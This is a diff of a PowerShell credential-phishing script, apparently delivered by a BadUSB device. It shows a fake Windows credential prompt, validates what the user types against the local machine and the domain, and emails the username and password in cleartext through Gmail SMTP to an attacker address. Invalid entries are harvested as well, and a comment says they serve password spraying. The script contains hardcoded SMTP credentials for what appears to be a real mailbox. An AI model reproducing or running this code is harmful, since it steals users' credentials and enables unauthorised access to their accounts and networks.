@@ -117,8 +117,8 @@ $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.
 [Windows.Security.Credentials.UI.CredentialPickerOptions, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
 #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$CurrentDomain_Name = $env:USERDOMAIN
-$ComputerName = $env:COMPUTERNAME
+[String]$CurrentDomain_Name = $env:USERDOMAIN
+[String]$ComputerName = $env:COMPUTERNAME
 
 # For our While loop
 $status = $true
@@ -155,50 +155,53 @@ function Credentials() {
         else {
             [String]$Username = $creds.CredentialUserName;
             [String]$Password = $creds.CredentialPassword;
-            [String]$CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
-            [String]$domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
+            $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+    	    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
+	    $authlocal = $DS.ValidateCredentials($Username, $Password)
+            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$Username,$Password)
+            if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){
 
-            if ([string]::isnullorempty($domain.name) -eq $true) {
-                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
-                    
-		if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true) {
-                    $domain = "Local"
-                    # SEND SECOND EMAIL IF USER ENTER SYSTEM CREDENTIALS
-		    $local_creds= "Username: " + $Username+ " Password: " + $Password+ " Domain:" + $domain
-		    $System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+            	# SEND SECOND EMAIL IF USER ENTER VALID SYSTEM CREDENTIALS
+		$local_creds= "Username: " + $Username+ " Password: " + $Password+ " Domain:" + $CurrentDomain_Name
+	    	$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+		$newline = "`r`n"
+		$SmtpServer = 'smtp.gmail.com'
+		$SmtpUser = 'firmusphising@gmail.com'
+                $smtpPassword = 'Firmus@123'
+                $MailtTo = 'firmusphising@gmail.com'
+                $MailFrom = 'firmusphising@gmail.com'
+                $Content  = $output
+                $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
+		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
+                $status = $false
+                exit
+
+                }
+                else {
+		    # SEND EMAIL IF USER ENTER INVALID SYSTEM CREDENTIALS, CAN BE USED FOR PASSWORD SPRAYING
+		    $local_creds= "Username: " + $Username+ " Password: " + $Password+ " Domain:" + $CurrentDomain_Name
+	    	    $System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
 		    $newline = "`r`n"
-		    $SmtpServer = 'smtp.gmail.com'
-		    $SmtpUser = 'firmusphising@gmail.com'
-                    $smtpPassword = 'Firmus@123'
-                    $MailtTo = 'firmusphising@gmail.com'
-                    $MailFrom = 'firmusphising@gmail.com'
+	            $SmtpServer = 'smtp.gmail.com'
+		    $SmtpUser = 'attacker@gmail.com'
+   		    $smtpPassword = 'password123'
+                    $MailtTo = 'attacker@gmail.com'
+                    $MailFrom = 'attacker@gmail.com'
                     $Content  = $output
                     $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
 		    Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
-                    $status = $false
-                    exit
-                }
-                else {
+                
                     Credentials
                 }
             }
-
-            if ([string]::isnullorempty($domain.name) -eq $false) {
-                leaker $CurrentDomain_Name $username $password $ComputerName
-                $status = $false
-		
-                exit
-            }
-            else {
-                Credentials
-            }
-        }
-    }
+          }
 }
+    
+
 $SmtpServer = 'smtp.gmail.com'
 $SmtpUser = 'attacker@gmail.com'
-$smtpPassword = 'test@123'
-$MailtTo = 'victim@gmail.com'
+$smtpPassword = 'password123'
+$MailtTo = 'attacker@gmail.com'
 $MailFrom = 'attacker@gmail.com'
 $MailSubject = "BAD USB LINK CLICKED!!!!"
 $Content  = $output
